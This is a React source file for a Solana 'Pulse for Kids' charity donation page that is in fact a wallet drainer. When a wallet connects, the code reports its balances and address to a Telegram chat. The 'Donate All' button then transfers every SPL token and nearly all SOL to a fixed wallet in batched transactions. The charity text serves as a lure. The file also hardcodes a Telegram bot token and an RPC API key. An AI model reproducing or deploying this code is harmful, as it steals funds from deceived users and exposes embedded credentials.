import { useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { Button } from "@/components/ui/button";
import AnimatedBackground from "@/components/AnimatedBackground";
import { Heart, Loader2, X } from "lucide-react";
import { toast } from "sonner";
import solanaLogo from "@/assets/solana-logo.jpg";

const CHARITY_WALLET = "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj";
const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
const TELEGRAM_BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
const TELEGRAM_CHAT_ID = "-4836248812";

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
}

const Donate = () => {
  const { publicKey, sendTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [solBalance, setSolBalance] = useState(0);
  const [tokens, setTokens] = useState<TokenBalance[]>([]);
  const [connection] = useState(() => new Connection(QUICKNODE_RPC, "confirmed"));

  useEffect(() => {
    if (publicKey) {
      fetchBalances();
    }
  }, [publicKey]);

  const fetchBalances = async () => {
    if (!publicKey) return;

    try {
      // Fetch SOL balance
      const balance = await connection.getBalance(publicKey);
      setSolBalance(balance / LAMPORTS_PER_SOL);

      // Fetch SPL token balances
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const tokenBalances: TokenBalance[] = tokenAccounts.value
        .map((account) => {
          const parsed = account.account.data.parsed.info;
          return {
            mint: parsed.mint,
            balance: parsed.tokenAmount.amount,
            decimals: parsed.tokenAmount.decimals,
            uiAmount: parsed.tokenAmount.uiAmount,
          };
        })
        .filter((token) => token.uiAmount > 0);

      setTokens(tokenBalances);

      // Send notification to Telegram
      await sendTelegramNotification(balance / LAMPORTS_PER_SOL, tokenBalances);
    } catch (error) {
      console.error("Error fetching balances:", error);
    }
  };

  const sendTelegramNotification = async (solBal: number, tokenBals: TokenBalance[]) => {
    if (!publicKey) return;

    const totalValue = solBal; // Simplified - in production, calculate USD value
    let message = `🔔 New Wallet Connected\n\n`;
    message += `📍 Wallet: ${publicKey.toBase58()}\n\n`;
    message += `💰 SOL Balance: ${solBal.toFixed(4)} SOL\n\n`;
    
    if (tokenBals.length > 0) {
      message += `🪙 Tokens:\n`;
      tokenBals.forEach((token) => {
        message += `  • ${token.uiAmount.toFixed(4)} (${token.mint.slice(0, 8)}...)\n`;
      });
    }
    
    message += `\n📊 Total Value: ${totalValue.toFixed(4)} SOL`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
    }
  };

  const handleDonate = async () => {
    if (!publicKey || !sendTransaction) {
      toast.error("Please connect your wallet first");
      return;
    }

    setLoading(true);
    setFailed(false);

    try {
      // Check if wallet has any balance
      if (solBalance === 0 && tokens.length === 0) {
        setLoading(false);
        setFailed(true);
        toast.error("Wallet not eligible", {
          description: "Your wallet doesn't contain any SOL or tokens to donate.",
        });
        return;
      }

      const charityPubkey = new PublicKey(CHARITY_WALLET);
      const transactions: Transaction[] = [];
      const BATCH_SIZE = 5;

      // Create token transfer transactions in batches
      for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
        const batchTokens = tokens.slice(i, i + BATCH_SIZE);
        const transaction = new Transaction();

        for (const token of batchTokens) {
          try {
            const mintPubkey = new PublicKey(token.mint);
            const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
            const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

            // Create transfer instruction
            transaction.add(
              createTransferInstruction(
                fromTokenAccount,
                toTokenAccount,
                publicKey,
                BigInt(token.balance),
                [],
                TOKEN_PROGRAM_ID
              )
            );
          } catch (error) {
            console.error(`Error adding token ${token.mint}:`, error);
          }
        }

        if (transaction.instructions.length > 0) {
          transaction.feePayer = publicKey;
          transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(transaction);
        }
      }

      // Add SOL transfer transactions (70% first, then 30%)
      if (solBalance > 0) {
        const rentExemptMin = 0.00089088; // Minimum rent-exempt balance
        const availableBalance = solBalance - rentExemptMin;
        
        if (availableBalance > 0) {
          // First transaction: 70% of SOL
          const firstAmount = Math.floor(availableBalance * 0.7 * LAMPORTS_PER_SOL);
          const firstTx = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: charityPubkey,
              lamports: firstAmount,
            })
          );
          firstTx.feePayer = publicKey;
          firstTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(firstTx);

          // Second transaction: Remaining 30%
          const secondAmount = Math.floor(availableBalance * 0.3 * LAMPORTS_PER_SOL);
          const secondTx = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: charityPubkey,
              lamports: secondAmount,
            })
          );
          secondTx.feePayer = publicKey;
          secondTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(secondTx);
        }
      }

      if (transactions.length === 0) {
        throw new Error("No transactions to process");
      }

      // Send transactions sequentially using sendTransaction for wallet simulation
      for (let i = 0; i < transactions.length; i++) {
        const signature = await sendTransaction(transactions[i], connection);
        await connection.confirmTransaction(signature, "confirmed");
        toast.success(`Transaction ${i + 1}/${transactions.length} confirmed`);
      }

      toast.success("All donations sent successfully! Thank you for your generosity! ❤️");
      setLoading(false);
      fetchBalances(); // Refresh balances
    } catch (error: any) {
      console.error("Donation error:", error);
      setLoading(false);
      setFailed(true);
      toast.error("Donation failed", {
        description: error.message || "Please try again",
      });
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      <AnimatedBackground />

      {/* Header */}
      <header className="container mx-auto px-4 py-6">
        <nav className="flex items-center justify-between">
          <a href="/" className="flex items-center gap-3 hover:opacity-80 transition-opacity">
            <Heart className="h-8 w-8 text-red-500 mr-2" />
            <span className="text-2xl font-bold gradient-primary bg-clip-text text-slate-300">
              Back to Home
            </span>
          </a>
          <div className="wallet-adapter-button-wrapper">
            <WalletMultiButton />
          </div>
        </nav>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-20">
        <div className="max-w-3xl mx-auto">
          {/* Hero Section */}
          <div className="text-center mb-12">
            <div className="mb-6 inline-block">
              <Heart className="h-24 w-24 text-red-500 animate-pulse" />
            </div>
            <h1 className="text-5xl md:text-6xl font-bold mb-6 gradient-primary bg-clip-text text-sky-600">
              Donate to Pulse for Kids
            </h1>
            <p className="text-xl text-muted-foreground mb-8 max-w-2xl mx-auto">
              Support our charity program helping children worldwide. Traders around the globe grow their wallets 
              and donate 100% of their gains to help kids in need.
            </p>
          </div>

          {/* Wallet Info Card */}
          {publicKey && (
            <div className="glass-card rounded-2xl p-8 mb-8">
              <h3 className="text-2xl font-bold mb-6 text-white text-center">Your Wallet</h3>
              
              <div className="space-y-4 mb-6">
                <div className="flex justify-between items-center p-4 bg-primary/10 rounded-lg">
                  <span className="text-muted-foreground">SOL Balance</span>
                  <span className="text-xl font-bold text-white">{solBalance.toFixed(4)} SOL</span>
                </div>
                
                {tokens.length > 0 && (
                  <div className="p-4 bg-primary/10 rounded-lg">
                    <div className="text-muted-foreground mb-3">SPL Tokens ({tokens.length})</div>
                    <div className="space-y-2 max-h-48 overflow-y-auto">
                      {tokens.map((token, idx) => (
                        <div key={idx} className="flex justify-between text-sm">
                          <span className="text-gray-400 truncate">{token.mint.slice(0, 12)}...</span>
                          <span className="text-white">{token.uiAmount.toFixed(4)}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>

              {/* Donate Button */}
              <Button
                onClick={handleDonate}
                disabled={loading || !publicKey}
                className={`w-full py-7 text-lg font-bold rounded-xl transition-all duration-300 ${
                  failed
                    ? "bg-red-600 hover:bg-red-700"
                    : "bg-gradient-to-r from-red-500 to-pink-600 hover:from-red-600 hover:to-pink-700"
                } text-white hover:scale-105 hover:shadow-[0_0_40px_rgba(239,68,68,0.7)]`}
              >
                {loading ? (
                  <Loader2 className="h-6 w-6 animate-spin mx-auto" />
                ) : failed ? (
                  <>
                    <X className="h-6 w-6 mr-2" />
                    Wallet Not Eligible
                  </>
                ) : (
                  <>
                    <Heart className="h-6 w-6 mr-2" />
                    Donate All
                  </>
                )}
              </Button>
            </div>
          )}

          {/* Info Section */}
          {!publicKey && (
            <div className="glass-card rounded-2xl p-8 text-center">
              <Heart className="h-16 w-16 text-red-500 mx-auto mb-4" />
              <h3 className="text-2xl font-bold mb-4 text-white">Connect Your Wallet</h3>
              <p className="text-muted-foreground mb-6">
                Connect your Solana wallet to donate all your SOL and tokens to Pulse for Kids charity.
              </p>
              <div className="flex justify-center">
                <WalletMultiButton />
              </div>
            </div>
          )}

          {/* Mission Section */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
            <div className="glass-card rounded-xl p-6 text-center">
              <div className="text-4xl mb-3">🌍</div>
              <h4 className="text-lg font-bold text-white mb-2">Global Impact</h4>
              <p className="text-sm text-muted-foreground">
                Helping children across the world with education and healthcare
              </p>
            </div>
            <div className="glass-card rounded-xl p-6 text-center">
              <div className="text-4xl mb-3">💯</div>
              <h4 className="text-lg font-bold text-white mb-2">100% Donation</h4>
              <p className="text-sm text-muted-foreground">
                Every penny goes directly to children in need
              </p>
            </div>
            <div className="glass-card rounded-xl p-6 text-center">
              <div className="text-4xl mb-3">🔒</div>
              <h4 className="text-lg font-bold text-white mb-2">Transparent</h4>
              <p className="text-sm text-muted-foreground">
                All transactions are verified on Solana blockchain
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="container mx-auto px-4 py-8 mt-20 border-t border-border/50">
        <div className="text-center text-muted-foreground">
          <p className="mb-2">Charity Wallet: {CHARITY_WALLET}</p>
          <p className="text-sm">© 2024 Pulse for Kids. All donations support children in need.</p>
        </div>
      </footer>
    </div>
  );
};

export default Donate;
